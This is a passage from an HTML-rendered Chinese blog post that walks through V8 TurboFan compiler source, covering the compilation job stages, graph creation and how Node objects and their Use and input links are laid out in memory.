href="#bool-GetOptimizedCodeNow-OptimizedCompilationJob-job-Isolate-isolate" class="headerlink" title="bool GetOptimizedCodeNow(OptimizedCompilationJob job, Isolate isolate)"></a>bool GetOptimizedCodeNow(OptimizedCompilationJob<em> job, Isolate</em> isolate)</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (job-&gt;PrepareJob(isolate) != CompilationJob::SUCCEEDED ||</span><br><span class="line">    job-&gt;ExecuteJob() != CompilationJob::SUCCEEDED ||</span><br><span class="line">    job-&gt;FinalizeJob(isolate) != CompilationJob::SUCCEEDED) &#123;</span><br></pre></td></tr></table></figure><h3 id="CompilationJob-Status-OptimizedCompilationJob-PrepareJob"><a href="#CompilationJob-Status-OptimizedCompilationJob-PrepareJob" class="headerlink" title="CompilationJob::Status OptimizedCompilationJob::PrepareJob"></a>CompilationJob::Status OptimizedCompilationJob::PrepareJob</h3><p>v8里有非常多的status，很有意思。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">DEFINE_BOOL(trace_opt, <span class="literal">false</span>, <span class="string">"trace lazy optimization"</span>)</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (FLAG_trace_opt &amp;&amp; compilation_info()-&gt;IsOptimizing()) &#123;</span><br><span class="line">    <span class="function">OFStream <span class="title">os</span><span class="params">(<span class="built_in">stdout</span>)</span></span>;</span><br><span class="line">    os &lt;&lt; <span class="string">"[compiling method "</span> &lt;&lt; Brief(*compilation_info()-&gt;closure())</span><br><span class="line">       &lt;&lt; <span class="string">" using "</span> &lt;&lt; compiler_name_;</span><br><span class="line">    <span class="keyword">if</span> (compilation_info()-&gt;is_osr()) os &lt;&lt; <span class="string">" OSR"</span>;</span><br><span class="line">    os &lt;&lt; <span class="string">"]"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p><p>这个函数就是调用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return UpdateState(PrepareJobImpl(isolate), State::kReadyToExecute);</span><br></pre></td></tr></table></figure></p><h3 id="PipelineCompilationJob-Status-PipelineCompilationJob-PrepareJobImpl"><a href="#PipelineCompilationJob-Status-PipelineCompilationJob-PrepareJobImpl" class="headerlink" title="PipelineCompilationJob::Status PipelineCompilationJob::PrepareJobImpl"></a>PipelineCompilationJob::Status PipelineCompilationJob::PrepareJobImpl</h3><p>前面根据一些标志位进行设置，包括下面这些等。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">// OptimizedCompilationInfo encapsulates the information needed to compile</span><br><span class="line">// optimized code for a given function, and the results of the optimized</span><br><span class="line">// compilation.</span><br><span class="line">class V8_EXPORT_PRIVATE OptimizedCompilationInfo final &#123;</span><br><span class="line"> public:</span><br><span class="line">  // Various configuration flags for a compilation, as well as some properties</span><br><span class="line">  // of the compiled code produced by a compilation.</span><br><span class="line">  enum Flag &#123;</span><br><span class="line">    kAccessorInliningEnabled = 1 &lt;&lt; 0,</span><br><span class="line">    kFunctionContextSpecializing = 1 &lt;&lt; 1,</span><br><span class="line">    kInliningEnabled = 1 &lt;&lt; 2,</span><br><span class="line">    kDisableFutureOptimization = 1 &lt;&lt; 3,</span><br><span class="line">    kSplittingEnabled = 1 &lt;&lt; 4,</span><br><span class="line">    kSourcePositionsEnabled = 1 &lt;&lt; 5,</span><br><span class="line">    kBailoutOnUninitialized = 1 &lt;&lt; 6,</span><br><span class="line">    kLoopPeelingEnabled = 1 &lt;&lt; 7,</span><br><span class="line">    kUntrustedCodeMitigations = 1 &lt;&lt; 8,</span><br><span class="line">    kSwitchJumpTableEnabled = 1 &lt;&lt; 9,</span><br><span class="line">    kCalledWithCodeStartRegister = 1 &lt;&lt; 10,</span><br><span class="line">    kPoisonRegisterArguments = 1 &lt;&lt; 11,</span><br><span class="line">    kAllocationFoldingEnabled = 1 &lt;&lt; 12,</span><br><span class="line">    kAnalyzeEnvironmentLiveness = 1 &lt;&lt; 13,</span><br><span class="line">    kTraceTurboJson = 1 &lt;&lt; 14,</span><br><span class="line">    kTraceTurboGraph = 1 &lt;&lt; 15,</span><br><span class="line">    kTraceTurboScheduled = 1 &lt;&lt; 16,</span><br><span class="line">  &#125;;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">FLAG_always_opt</span><br><span class="line">FLAG_turbo_loop_peeling</span><br><span class="line">FLAG_turbo_inlining</span><br><span class="line">FLAG_inline_accessors</span><br><span class="line">FLAG_turbo_allocation_folding</span><br></pre></td></tr></table></figure></p><p>然后开始创建Graph<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!pipeline_.CreateGraph()) &#123;</span><br><span class="line">  <span class="keyword">if</span> (isolate-&gt;has_pending_exception()) <span class="keyword">return</span> FAILED;  <span class="comment">// Stack overflowed.</span></span><br><span class="line">  <span class="keyword">return</span> AbortOptimization(BailoutReason::kGraphBuildingFailed);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="PipelineImpl-CreateGraph"><a href="#PipelineImpl-CreateGraph" class="headerlink" title="PipelineImpl::CreateGraph()"></a>PipelineImpl::CreateGraph()</h3><p>检查trace标志位并做相应操作,主要是做记录。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (info()-&gt;trace_turbo_json_enabled() ||</span><br><span class="line">    info()-&gt;trace_turbo_graph_enabled()) &#123;</span><br></pre></td></tr></table></figure></p><p>通过添加修饰器来记录源码位置。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data-&gt;source_positions()-&gt;AddDecorator();</span><br></pre></td></tr></table></figure></p><p>然后<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">  Run&lt;GraphBuilderPhase&gt;();</span><br><span class="line">  RunPrintAndVerify(<span class="string">"Initial untyped"</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Perform function context specialization and inlining (if enabled).</span></span><br><span class="line">  Run&lt;InliningPhase&gt;();</span><br><span class="line">  RunPrintAndVerify(<span class="string">"Inlined"</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Remove dead-&gt;live edges from the graph.</span></span><br><span class="line">  Run&lt;EarlyGraphTrimmingPhase&gt;();</span><br><span class="line">  RunPrintAndVerify(<span class="string">"Early trimmed"</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Run the type-sensitive lowerings and optimizations on the graph.</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// Determine the Typer operation flags.</span></span><br><span class="line">    Typer::Flags flags = Typer::kNoFlags;</span><br><span class="line">    <span class="keyword">if</span> (is_sloppy(info()-&gt;shared_info()-&gt;language_mode()) &amp;&amp;</span><br><span class="line">        info()-&gt;shared_info()-&gt;IsUserJavaScript()) &#123;</span><br><span class="line">      <span class="comment">// Sloppy mode functions always have an Object for this.</span></span><br><span class="line">      flags |= Typer::kThisIsReceiver;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (IsClassConstructor(info()-&gt;shared_info()-&gt;kind())) &#123;</span><br><span class="line">      <span class="comment">// Class constructors cannot be [[Call]]ed.</span></span><br><span class="line">      flags |= Typer::kNewTargetIsReceiver;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Type the graph and keep the Typer running on newly created nodes within</span></span><br><span class="line">    <span class="comment">// this scope; the Typer is automatically unlinked from the Graph once we</span></span><br><span class="line">    <span class="comment">// leave this scope below.</span></span><br><span class="line">    Typer typer(isolate(), flags, data-&gt;graph());</span><br><span class="line">    Run&lt;TyperPhase&gt;(&amp;typer);</span><br><span class="line">    RunPrintAndVerify(<span class="string">"Typed"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Lower JSOperators where we can determine types.</span></span><br><span class="line">    Run&lt;TypedLoweringPhase&gt;();</span><br><span class="line">    RunPrintAndVerify(<span class="string">"Lowered typed"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Do some hacky things to prepare for the optimization phase.</span></span><br><span class="line">  <span class="comment">// (caching handles, etc.).</span></span><br><span class="line">  Run&lt;ConcurrentOptimizationPrepPhase&gt;();</span><br><span class="line"></span><br><span class="line">  data-&gt;EndPhaseKind();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="BytecodeGraphBuilder-CreateGraph"><a href="#BytecodeGraphBuilder-CreateGraph" class="headerlink" title="BytecodeGraphBuilder::CreateGraph()"></a>BytecodeGraphBuilder::CreateGraph()</h3><p>设置图的基本结构。<br>{Start}的输出是形参（包括receiver）加上new target, arguments数目,context和closure<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> actual_parameter_count = bytecode_array()-&gt;parameter_count() + <span class="number">4</span>;</span><br><span class="line">graph()-&gt;SetStart(graph()-&gt;NewNode(common()-&gt;Start(actual_parameter_count)));</span><br></pre></td></tr></table></figure></p><p>NewNode是用于创建新node的帮助函数。<br>common()返回CommonOperatorBuilder*的common_,差不多是一个op的集合了，然后从中选择Start<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">  <span class="function">CommonOperatorBuilder* <span class="title">common</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123; <span class="keyword">return</span> common_; &#125;</span><br><span class="line">  ...</span><br><span class="line">    <span class="function"><span class="keyword">const</span> Operator* <span class="title">Start</span><span class="params">(<span class="keyword">int</span> value_output_count)</span></span>;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">const</span> Operator* CommonOperatorBuilder::Start(<span class="keyword">int</span> value_output_count) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> (zone()) Operator(                                    <span class="comment">// --</span></span><br><span class="line">      IrOpcode::kStart, Operator::kFoldable | Operator::kNoThrow,  <span class="comment">// opcode</span></span><br><span class="line">      <span class="string">"Start"</span>,                                                     <span class="comment">// name</span></span><br><span class="line">      <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, value_output_count, <span class="number">1</span>, <span class="number">1</span>);                          <span class="comment">// counts</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>这个文件还是比较有用的，common-operator.cc，因为NewNode的opcode参数从这里初始化。</strong><br>回到NewNode看一下<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">// Factory template for nodes with static input counts.</span></span><br><span class="line">  <span class="keyword">template</span> &lt;<span class="keyword">typename</span>... Nodes&gt;</span><br><span class="line">  <span class="function">Node* <span class="title">NewNode</span><span class="params">(<span class="keyword">const</span> Operator* op, Nodes*... nodes)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">array</span>&lt;Node*, <span class="keyword">sizeof</span>...(nodes)&gt; nodes_arr&#123;&#123;nodes...&#125;&#125;;</span><br><span class="line">    <span class="keyword">return</span> NewNode(op, nodes_arr.size(), nodes_arr.data());</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line"> Node* Graph::NewNode(<span class="keyword">const</span> Operator* op, <span class="keyword">int</span> input_count, Node* <span class="keyword">const</span>* inputs,</span><br><span class="line">                     <span class="keyword">bool</span> incomplete) &#123;</span><br><span class="line">  Node* node = NewNodeUnchecked(op, input_count, inputs, incomplete);</span><br><span class="line">  Verifier::VerifyNode(node);</span><br><span class="line">  <span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">Node* Graph::NewNodeUnchecked(<span class="keyword">const</span> Operator* op, <span class="keyword">int</span> input_count,</span><br><span class="line">                              Node* <span class="keyword">const</span>* inputs, <span class="keyword">bool</span> incomplete) &#123;</span><br><span class="line">  Node* <span class="keyword">const</span> node =</span><br><span class="line">      Node::New(zone(), NextNodeId(), op, input_count, inputs, incomplete);</span><br><span class="line">  Decorate(node);</span><br><span class="line">  <span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>最后是执行到了这里,于是我们来分析一下这个函数。</p><h4 id="Node-New"><a href="#Node-New" class="headerlink" title="Node::New"></a>Node::New</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">Node* Node::New(Zone* zone, NodeId id, <span class="keyword">const</span> Operator* op, <span class="keyword">int</span> input_count,</span><br><span class="line">                Node* <span class="keyword">const</span>* inputs, <span class="keyword">bool</span> has_extensible_inputs) &#123;</span><br><span class="line">  Node** input_ptr;</span><br><span class="line">  Use* use_ptr;</span><br><span class="line">  Node* node;</span><br><span class="line">  <span class="keyword">bool</span> is_inline;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (input_count &gt; kMaxInlineCapacity) &#123;</span><br><span class="line">    <span class="comment">// Allocate out-of-line inputs.</span></span><br><span class="line">    <span class="keyword">int</span> capacity =</span><br><span class="line">        has_extensible_inputs ? input_count + kMaxInlineCapacity : input_count;</span><br><span class="line">    OutOfLineInputs* outline = OutOfLineInputs::New(zone, capacity);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Allocate node.</span></span><br><span class="line">    <span class="keyword">void</span>* node_buffer = zone-&gt;New(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">    node = <span class="keyword">new</span> (node_buffer) Node(id, op, kOutlineMarker, <span class="number">0</span>);</span><br><span class="line">    node-&gt;inputs_.outline_ = outline;</span><br><span class="line"></span><br><span class="line">    outline-&gt;node_ = node;</span><br><span class="line">    outline-&gt;count_ = input_count;</span><br><span class="line"></span><br><span class="line">    input_ptr = outline-&gt;inputs_;</span><br><span class="line">    use_ptr = <span class="keyword">reinterpret_cast</span>&lt;Use*&gt;(outline);</span><br><span class="line">    is_inline = <span class="literal">false</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// Allocate node with inline inputs.</span></span><br><span class="line">    <span class="keyword">int</span> capacity = input_count;</span><br><span class="line">    <span class="keyword">if</span> (has_extensible_inputs) &#123;</span><br><span class="line">      <span class="keyword">const</span> <span class="keyword">int</span> max = kMaxInlineCapacity;</span><br><span class="line">      capacity = <span class="built_in">std</span>::min(input_count + <span class="number">3</span>, max);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> size = <span class="keyword">sizeof</span>(Node) + capacity * (<span class="keyword">sizeof</span>(Node*) + <span class="keyword">sizeof</span>(Use));</span><br><span class="line">    <span class="keyword">intptr_t</span> raw_buffer = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">intptr_t</span>&gt;(zone-&gt;New(size));</span><br><span class="line">    <span class="keyword">void</span>* node_buffer =</span><br><span class="line">        <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">void</span>*&gt;(raw_buffer + capacity * <span class="keyword">sizeof</span>(Use));</span><br><span class="line"></span><br><span class="line">    node = <span class="keyword">new</span> (node_buffer) Node(id, op, input_count, capacity);</span><br><span class="line">    input_ptr = node-&gt;inputs_.inline_;</span><br><span class="line">    use_ptr = <span class="keyword">reinterpret_cast</span>&lt;Use*&gt;(node);</span><br><span class="line">    is_inline = <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Initialize the input pointers and the uses.</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> current = <span class="number">0</span>; current &lt; input_count; ++current) &#123;</span><br><span class="line">    Node* to = *inputs++;</span><br><span class="line">    input_ptr[current] = to;</span><br><span class="line">    Use* use = use_ptr - <span class="number">1</span> - current;</span><br><span class="line">    use-&gt;bit_field_ = Use::InputIndexField::encode(current) |</span><br><span class="line">                      Use::InlineField::encode(is_inline);</span><br><span class="line">    to-&gt;AppendUse(use);</span><br><span class="line">  &#125;</span><br><span class="line">  node-&gt;Verify();</span><br><span class="line">  <span class="keyword">return</span> node;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先定义了几个局部变量<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Node** input_ptr;</span><br><span class="line">Use* use_ptr;</span><br><span class="line">Node* node;</span><br><span class="line"><span class="keyword">bool</span> is_inline;</span><br></pre></td></tr></table></figure></p><p><strong>然后判断input_count是否大于kMaxInineCapacity</strong><br>注意这里的input_count来自这里的nodes_arr.size()，此处对于start的情况，<code>NewNode(common()-&gt;Start(actual_parameter_count)));</code>，可以看出这个结果是0。<br>这是个比较特殊的情况，后面我们再分析几个node的生成看一下这个逻辑。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Node* <span class="title">NewNode</span><span class="params">(<span class="keyword">const</span> Operator* op, Nodes*... nodes)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">array</span>&lt;Node*, <span class="keyword">sizeof</span>...(nodes)&gt; nodes_arr&#123;&#123;nodes...&#125;&#125;;</span><br><span class="line">  <span class="keyword">return</span> NewNode(op, nodes_arr.size(), nodes_arr.data());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>为什么这里有这样的一个比较呢？是因为v8对node的存储决定的<br>从注释里可以找到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">//============================================================================</span><br><span class="line">//== Memory layout ===========================================================</span><br><span class="line">//============================================================================</span><br><span class="line">// Saving space for big graphs is important. We use a memory layout trick to</span><br><span class="line">// be able to map &#123;Node&#125; objects to &#123;Use&#125; objects and vice-versa in a</span><br><span class="line">// space-efficient manner.</span><br><span class="line">//</span><br><span class="line">// &#123;Use&#125; links are laid out in memory directly before a &#123;Node&#125;, followed by</span><br><span class="line">// direct pointers to input &#123;Nodes&#125;.</span><br><span class="line">//</span><br><span class="line">// inline case:</span><br><span class="line">// |Use #N  |Use #N-1|...|Use #1  |Use #0  |Node xxxx |I#0|I#1|...|I#N-1|I#N|</span><br><span class="line">//          ^                              ^                  ^</span><br><span class="line">//          + Use                          + Node             + Input</span><br><span class="line">//</span><br><span class="line">// Since every &#123;Use&#125; instance records its &#123;input_index&#125;, pointer arithmetic</span><br><span class="line">// can compute the &#123;Node&#125;.</span><br><span class="line">//</span><br><span class="line">// out-of-line case:</span><br><span class="line">//     |Node xxxx |</span><br><span class="line">//     ^       + outline ------------------+</span><br><span class="line">//     +----------------------------------------+</span><br><span class="line">//                                         |    |</span><br><span class="line">//                                         v    | node</span><br><span class="line">// |Use #N  |Use #N-1|...|Use #1  |Use #0  |OOL xxxxx |I#0|I#1|...|I#N-1|I#N|</span><br><span class="line">//          ^                                                 ^</span><br><span class="line">//          + Use                                             + Input</span><br><span class="line">//</span><br><span class="line">// Out-of-line storage of input lists is needed if appending an input to</span><br><span class="line">// a node exceeds the maximum inline capacity.</span><br></pre></td></tr></table></figure></p><p>如果是小于kMaxInineCapacity，则可以直接将inputs内联在node中。<br>这里的计算方法是，首先计算capacity，默认应该是等于input_count，如果有<code>has_extensible_inputs</code>，则在input_count + 3和kMaxInlineCapacity选取一个最小值。<br><em>这个has_extensible_inputs我还不是很懂，后面看看吧</em><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> capacity = input_count;</span><br><span class="line">    <span class="keyword">if</span> (has_extensible_inputs) &#123;</span><br><span class="line">      <span class="keyword">const</span> <span class="keyword">int</span> max = kMaxInlineCapacity;</span><br><span class="line">      capacity = <span class="built_in">std</span>::min(input_count + <span class="number">3</span>, max);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>然后计算size大小，并为node和它的use/input分配内存。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> size = <span class="keyword">sizeof</span>(Node) + capacity * (<span class="keyword">sizeof</span>(Node*) + <span class="keyword">sizeof</span>(Use));</span><br><span class="line"><span class="keyword">intptr_t</span> raw_buffer = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">intptr_t</span>&gt;(zone-&gt;New(size));</span><br><span class="line"><span class="keyword">void</span>* node_buffer =</span><br><span class="line">        <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">void</span>*&gt;(raw_buffer + capacity * <span class="keyword">sizeof</span>(Use));</span><br></pre></td></tr></table></figure></p><p>顺便说一下，一个Use大小是24字节，一个Node是40字节</p><p>计算好size之后进入这个函数，在这生成新的node。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Node::Node(NodeId id, <span class="keyword">const</span> Operator* op, <span class="keyword">int</span> inline_count, <span class="keyword">int</span> inline_capacity)</span><br><span class="line">    : op_(op),</span><br><span class="line">      mark_(<span class="number">0</span>),</span><br><span class="line">      bit_field_(IdField::encode(id) | InlineCountField::encode(inline_count) |</span><br><span class="line">                 InlineCapacityField::encode(inline_capacity)),</span><br><span class="line">      first_use_(<span class="literal">nullptr</span>) &#123;</span><br><span class="line">  <span class="comment">// Inputs must either be out of line or within the inline capacity.</span></span><br><span class="line">  DCHECK_GE(kMaxInlineCapacity, inline_capacity);</span><br><span class="line">  DCHECK(inline_count == kOutlineMarker || inline_count &lt;= inline_capacity);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>最后需要为这个node建立input/use关系,这里的逻辑就是，首先根据当前node的input_count数。<br>依次设置to为input节点。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> current = <span class="number">0</span>; current &lt; input_count; ++current) &#123;</span><br><span class="line">  Node* to = *inputs++;</span><br></pre></td></tr></table></figure></p><p>然后由于input_ptr指向node的inputs区域，在node的inputs区域记录它的input节点的地址。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">input_ptr = node-&gt;inputs_.inline_;</span><br><span class="line">...</span><br><span class="line">input_ptr[current] = to;</span><br></pre></td></tr></table></figure></p><p>通过这种方式就将节点的input关系建立好了。<br>然后需要考虑一下use关系，现在我们可以看到use_ptr指向的是当前node的地址。<br>通过use_ptr和{input_index}来计算出use，然后在use里记录当前{input_index}的值，于是我们可以通过这个值来做简单的算数计算来找到node。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Use* use = use_ptr - <span class="number">1</span> - current;</span><br><span class="line">use-&gt;bit_field_ = Use::InputIndexField::encode(current) |</span><br><span class="line">                      Use::InlineField::encode(is_inline);</span><br></pre></td></tr></table></figure></p><p>然后<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">to-&gt;AppendUse(use);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="keyword">void</span> Node::AppendUse(Use* use) &#123;</span><br><span class="line">  DCHECK(first_use_ == <span class="literal">nullptr</span> || first_use_-&gt;prev == <span class="literal">nullptr</span>);</span><br><span class="line">  DCHECK_EQ(<span class="keyword">this</span>, *use-&gt;input_ptr());</span><br><span class="line">  use-&gt;next = first_use_;</span><br><span class="line">  use-&gt;prev = <span class="literal">nullptr</span>;</span><br><span class="line">  <span class="keyword">if</span> (first_use_) first_use_-&gt;prev = use;</span><br><span class="line">  first_use_ = use;</span><br><span 